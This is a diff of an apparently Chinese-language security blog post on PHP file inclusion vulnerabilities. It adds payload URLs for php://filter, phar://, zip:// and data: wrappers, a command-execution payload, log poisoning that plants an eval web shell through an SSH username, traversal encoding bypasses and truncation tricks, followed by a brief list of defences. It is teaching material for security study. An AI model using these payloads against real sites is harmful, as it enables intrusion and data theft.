@@ -210,12 +210,12 @@
         <div class="post-content" id="post-content" itemprop="postContent">
             
             <h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.include()</span><br><span class="line">2.include_once()</span><br><span class="line">3.require()</span><br><span class="line">4.require_once()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.include()</span><br><span class="line">2.include_once()</span><br><span class="line">3.require()</span><br><span class="line">4.require_once()</span><br><span class="line">5.file_get_contents()</span><br><span class="line">6.readfile()</span><br></pre></td></tr></table></figure>
 
-<h3 id="以上4个函数的区别"><a href="#以上4个函数的区别" class="headerlink" title="以上4个函数的区别"></a>以上4个函数的区别</h3><p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p>
+<h3 id="以上前4个函数的区别"><a href="#以上前4个函数的区别" class="headerlink" title="以上前4个函数的区别"></a>以上前4个函数的区别</h3><p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p>
 <p>include_once()、require_once()功能与上述两者几乎相同。不同的是如果一个文件已经被包含了，则不会被再次包含，以此避免函数重定义或者变量重新赋值等问题。</p>
 <p>利用这四个函数所包含的文件都会被直接作为php文件进行解析。</p>
-<h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>若在同一目录下有文件info.txt，内容为 <strong><?php phpinfo(); ?></strong> 那么访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx?file=info.txt</span><br></pre></td></tr></table></figure>
@@ -241,9 +241,13 @@
 
 <h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>这个是一个过滤器，里面的过滤方法很多，我们如果不想执行被包含的代码，我们就可以使用base64 编码输出，通常用来读取源码</p>
 <p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。</span><br><span class="line"><span class="built_in">read</span>=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;     任何没有以 <span class="built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.txt</span><br></pre></td></tr></table></figure>
 
 <a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/2.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/2.jpg"></a>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><strong>index.php?file=php://filter/convert.base64-encode/resource=index.php</strong><br>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。</span><br><span class="line"><span class="built_in">read</span>=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;     任何没有以 <span class="built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+
+<a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/3.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/3.jpg"></a>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意点：</span><br><span class="line">**(1)记住一旦使用了 <span class="built_in">read</span> 选项，我们就值关心数据流的来源，这里的数据流的来源就是 resource 传入的，至于经过过滤器以后这个数据流要去哪里，这不是我们这个处理能决定的，还要依赖外部的函数**</span><br><span class="line">**(2)一旦使用了 write 选项，我们就只关系数据的输出，数据的输出就是我们指定的 resource 的文件，而数据的输入要靠外部的函数帮我们实现**</span><br><span class="line">**(3)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左**</span><br></pre></td></tr></table></figure>
 
 <h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p><strong>(1)字符串过滤器</strong></p>
@@ -261,8 +265,137 @@
 <p>这个过滤器能实现几乎任意的两种编码之间的转化</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.iconv.UTF-8%2FASCII%2F%2FTRANSLIT/resource=...</span><br><span class="line">convert.iconv.ISO-8859-1/UTF-8</span><br><span class="line">php://filter/convert.iconv.UTF-8%2fUTF-7/resource=</span><br></pre></td></tr></table></figure>
 
-<p><strong>./</strong>当前目录,<strong>../</strong>上一级目录,这样的遍历目录来读取文件</p>
-<h3 id="本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？"><a href="#本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？" class="headerlink" title="本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？"></a>本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？</h3><p>常见几个路径：<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log<br>更多见上面的路径收集</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：<strong>php版本大于等于php5.3.0</strong></p>
+<p>假设有个文件info.txt，其内容为<?php phpinfo(); ?>，将其打包为zip压缩包</p>
+<p>指定绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phar://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/info.zip/info.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phar://info.zip/info.txt</span><br></pre></td></tr></table></figure>
+
+<a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/4.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/4.jpg"></a>
+
+<h4 id="使用phar-拓展php反序列化攻击面"><a href="#使用phar-拓展php反序列化攻击面" class="headerlink" title="使用phar://拓展php反序列化攻击面"></a>使用phar://拓展php反序列化攻击面</h4><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：<strong>php版本大于等于php5.3.0</strong></p>
+<p>构造zip包的方法与phar相同</p>
+<p>但使用zip协议，需要指定绝对路径，注意url编码,因为这个 # 会和url协议中的 # 冲突，将 # 编码为 %23 ，之后加上压缩包内的问件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/info.zip%23info.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-URL-schema"><a href="#data-URL-schema" class="headerlink" title="data:URL schema"></a>data:URL schema</h3><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
+<p>和php伪协议的input类似</p>
+<p>利用条件：<br>    1.php版本大于等于php5.2<br>    2.allow_url_fopen = On<br>    3.allow_url_include = On</p>
+<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:text/plain"></a>data:text/plain</h4><p>输出直接显示在相应的URL中，显示参数：data:text/plain。<br>然后你需要执行如下所示的php代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/6.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/6.jpg"></a>
+
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain,&lt;?php system(<span class="string">'whoami'</span>);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data:text/plain;base64"></a>data:text/plain;base64</h4><p>有另一种方法来使用data: text/plain; base64，不过此时你需要使用base64编码来执行PHP代码，base64php代码如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/7.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/7.jpg"></a>
+<p>其中加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<?php phpinfo();?></p>
+<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到</p>
+<p>常见的php-session存放位置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1./var/lib/php/sess_PHPSESSID</span><br><span class="line">2./var/lib/php/sess_PHPSESSID</span><br><span class="line">3./tmp/sess_PHPSESSID</span><br><span class="line">4./tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到</p>
+<a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/8.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/8.jpg"></a>
+
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码</p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><p>利用条件：需要知道服务器日志的存储路径，且日志文件可读</p>
+<p><strong>开启日志</strong></p>
+<a rel=PHP文件包含漏洞 href="/var/log/apache2/" title="但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改 {% asset_img /2019/11/22/文件包含漏洞/10.jpg" data-fancybox="images"><img src="/var/log/apache2/" class="9.jpg} 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在" title="但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改 {% asset_img /2019/11/22/文件包含漏洞/10.jpg"></a>
+
+
+
+<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>利用条件：需要知道ssh-logd位置，且可读。<br>默认情况下为/var/log/auth.log</p>
+<p>用ssh连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php @eval($_GET['</span>dd<span class="string">']) ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure>
+
+<p>提示输入密码随便输入即可。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=/var/<span class="built_in">log</span>/auth.log&amp;dd=ifconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p>利用条件：<br>    1.php以cgi方式运行，这样environ才会保持UA头<br>    2.environ文件存储位置已知，且environ文件刻度</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>与包含environ类似</p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><a rel=PHP文件包含漏洞 href="/2019/11/22/文件包含漏洞/12.jpg" title="" data-fancybox="images"><img src="/2019/11/22/文件包含漏洞/12.jpg"></a>
+
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可</p>
+<p>类似利用临时文件的存在，竞争时间去包含的，可以看：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a></p>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>平常碰到的情况肯定不会是简简单单的include $_GET[‘file’];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就很“难”直接去包含前面提到的种种文件</p>
+<h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p><strong>./</strong>当前目录,<strong>../</strong>上一级目录,这样的遍历目录来读取文件</p>
+<p>现在在/var/log/info.txt文件中有php代码 <?php phpinfo(); ?> ，则利用../可以进行目录遍历：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=../../<span class="built_in">log</span>/info.txt</span><br></pre></td></tr></table></figure>
+
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功</p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于<strong>../</strong>等做一些过滤，可以用一些编码来进行绕过。</p>
+<p>一.利用url编码</p>
+<pre><code>1.**../**
+    1) %2e%2e%2f
+    2) ..%2f
+    3) %2e%2e/
+
+2.**..\**
+    1) %2e%2e%5c
+    2) ..%5c
+    3) %2e%2e\</code></pre><p>二.二次编码</p>
+<pre><code>1.**../**
+    1) %252e%252e%252f
+
+2.**..\**
+    1) %252e%252e%255c</code></pre><p>三.容器/服务器的编码方式</p>
+<pre><code>1.**../**
+    1) ..%c0%af
+    2) %c0%ae%c0%ae/    (java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）)
+
+2.**..\**
+    1) ..%c1%9c</code></pre><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>url格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]<span class="comment">#fragment</span></span><br><span class="line"></span><br><span class="line">	1.protocol（协议）:指定使用的传输协议</span><br><span class="line">	2.hostname（主机名）:是指存放资源的服务器的域名系统（DNS）主机名或 IP 地址</span><br><span class="line">	3.:port（端口号）</span><br><span class="line">	4.path（路径）</span><br><span class="line">	5.;parameters（参数）</span><br><span class="line">	6.?query（查询）</span><br><span class="line">	7.fragment（信息片断）</span><br></pre></td></tr></table></figure>
+
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制</p>
+<h5 id="query（-）"><a href="#query（-）" class="headerlink" title="query（?）"></a>query（?）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>
+
+<p>那么包含的文件就为<a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过的</p>
+<h5 id="fragment（-）"><a href="#fragment（-）" class="headerlink" title="fragment（#）"></a>fragment（#）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
+
+<p>那么包含的文件为<a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>#后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。（注意：需要把#进行url编码为%23）</p>
+<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>前面提到过利用zip协议和phar协议，现在假设测试代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造个压缩包，包内的test.php的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用zip协议（注意要指定绝对路径）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>
+
+<p>那么拼接后则为：zip://D:/software/phpstudy/PHPTutorial/WWW/test/chybeta.zip#chybeta/test/test.php</p>
+<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件：php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在Linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<strong>./</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=././././........././././shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>则后缀/test/test.php，在达到最大值后会被直接丢弃掉</p>
+<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件：php版本 &lt; php 5.3.4</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>
+
+<h2 id="防御手法"><a href="#防御手法" class="headerlink" title="防御手法"></a>防御手法</h2><pre><code>1.无需情况下设置allow_url_include和allow_url_fopen为关闭
+2.在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败
+3.做好文件的权限管理
+4.对危险字符进行过滤等等
+5.尽量不使用动态包含
+6.</code></pre><h3 id="本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？"><a href="#本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？" class="headerlink" title="本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？"></a>本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？</h3><p>常见几个路径：<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log<br>更多见上面的路径收集</p>
 <h3 id="利用-proc-self-environ进行包含"><a href="#利用-proc-self-environ进行包含" class="headerlink" title="利用/proc/self/environ进行包含"></a>利用/proc/self/environ进行包含</h3><h3 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h3><p>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p>
 <h3 id="包含其他由php创建的tmp文件"><a href="#包含其他由php创建的tmp文件" class="headerlink" title="包含其他由php创建的tmp文件"></a>包含其他由php创建的tmp文件</h3><p>上传一个文件的过程,可以在tmp那里包含<br>jpg<br>向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p>
 <h3 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h3><h3 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h3><h3 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h3>
@@ -272,7 +405,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-11-25T14:22:13.828Z" itemprop="dateUpdated">2019-11-25 22:22:13</time>
+    Last updated: <time datetime="2019-11-30T13:36:08.616Z" itemprop="dateUpdated">2019-11-30 21:36:08</time>
 </span><br>
 
 
@@ -339,7 +472,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/11/29/利用phar拓展php反序列化漏洞攻击面/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">利用phar拓展php反序列化漏洞攻击面</h4>
+      </a>
+    </div>
   
 
   
@@ -358,7 +498,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#相关函数"><span class="post-toc-number">1.</span> <span class="post-toc-text">相关函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#以上4个函数的区别"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">以上4个函数的区别</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#test1"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">test1</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分类"><span class="post-toc-number">2.</span> <span class="post-toc-text">分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LFI-Local-File-Inclusion"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">LFI(Local File Inclusion)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RFI-Remote-File-Inclusion"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">RFI(Remote File Inclusion)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#包含技巧"><span class="post-toc-number">3.</span> <span class="post-toc-text">包含技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php伪协议"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">php伪协议</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php-input"><span class="post-toc-number">3.1.1.</span> <span class="post-toc-text">php://input</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php-filter"><span class="post-toc-number">3.1.2.</span> <span class="post-toc-text">php://filter</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用-proc-self-environ进行包含"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">利用/proc/self/environ进行包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含session文件"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">包含session文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含其他由php创建的tmp文件"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">包含其他由php创建的tmp文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#jsp文件包含漏洞"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">jsp文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#asp文件包含漏洞"><span class="post-toc-number">3.7.</span> <span 